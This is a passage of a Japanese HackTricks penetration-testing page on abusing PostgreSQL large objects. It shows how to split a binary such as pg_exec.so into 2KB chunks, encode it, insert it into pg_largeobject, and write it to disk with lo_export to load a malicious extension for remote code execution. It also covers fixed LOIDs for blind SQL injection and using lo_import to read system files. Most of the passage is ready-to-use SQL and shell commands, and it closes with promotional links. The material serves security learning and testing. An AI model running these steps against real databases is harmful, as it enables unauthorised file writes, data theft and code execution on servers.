```bash
split -b 2048 yourfile
```

このコマンドは、指定されたバイナリファイルを2KBのチャンクに分割します。

そして、以下のようにPostgreSQLの`pg_largeobject`テーブルにそれらのチャンクを挿入することができます。

```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (20485, 0, '\\x3c3f786d6c...');
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (20485, 1, '\\x5b7b226964...');
...
```

ここで、`loid`は大きなオブジェクトのID、`pageno`はチャンクの番号、`data`はバイナリデータのヘキサデシマル表現です。

最後に、以下のコマンドを使用してファイルシステムにエクスポートすることができます。

```sql
SELECT lo_export(20485, '/tmp/yourfile');
```

`lo_export`関数は、指定された`loid`の大きなオブジェクトをファイルシステムの指定されたパスにエクスポートします。
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
ファイルをBase64またはHexにエンコードするには、以下を使用できます：
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
この脆弱性を利用する際には、**2KBのクリアテキストバイトのチャンク**を送信する必要があることを覚えておいてください（2KBのbase64またはhexエンコードされたバイトではありません）。これを自動化しようとする場合、**hexエンコード**されたファイルのサイズは**倍**になります（つまり、各チャンクに対して4KBのエンコードデータを送信する必要があります）し、**base64**エンコードされたファイルのサイズは `ceil(n / 3) * 4` になります。
{% endhint %}

また、デバッグプロセスでは、作成された大きなオブジェクトの内容を以下で確認できます：
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# lo\_creat & Base64 を使用する

まず、バイナリデータが保存される LOID を作成する必要があります:
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
**Blind SQLインジェクション**を悪用している場合、固定された**LOID**を使用して`lo_create`を使うことに興味があるでしょう。そうすれば、**コンテンツ**を**アップロード**する場所を**知る**ことができます。\
また、関数が`lo_creat`と`lo_create`であるため、構文エラーはないことに注意してください。

LOIDは`pg_largeobject`テーブルでオブジェクトを識別するために使用されます。`pg_largeobject`テーブルに2KBのチャンクを挿入するには、次の方法があります：
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
最終的には、以下の操作を行うことでファイルシステムにファイルをエクスポートできます（この例では使用されたLOIDは`173454`でした）：
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
最新バージョンのpostgresでは、**パスを指定せずに拡張機能をアップロードする必要がある**かもしれません。[**詳細はこちらをお読みください**。](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

エクスポート後に作成された大きなオブジェクトを削除することに興味があるかもしれません：
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# lo\_import & Hex を使用する

このシナリオでは、lo\_import を使用して大きなオブジェクトを作成します。幸いなことに、この場合は LOID を指定することができます（またはできません）：
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
作成したオブジェクトにデータを挿入していくことができます（2KBのチャンクを挿入する必要があることを覚えておいてください）：
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
HEXは単にhexでなければなりません（`0x`や`\x`を除く）、例：
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
最後に、データをファイルにエクスポートして、大きなオブジェクトを削除します：
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
最新バージョンのPostgreSQLでは、**パスを指定せずに拡張機能をアップロードする**必要があるかもしれません。[**詳細情報はこちらを読んでください**。](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# 制限事項

PostgreSQLの大きなオブジェクトに関するドキュメントを読むと、**大きなオブジェクトにはACL**（アクセス制御リスト）があることがわかります。**新しい大きなオブジェクト**を設定して、ユーザーがそれらを作成したにも関わらず、**十分な権限がない**ようにすることが可能です。

しかし、**現在のユーザーが読むことを許可するACLを持つ古いオブジェクト**が存在するかもしれません。その場合、そのオブジェクトの内容を抽出することができます。


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSのハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください**。

</details>
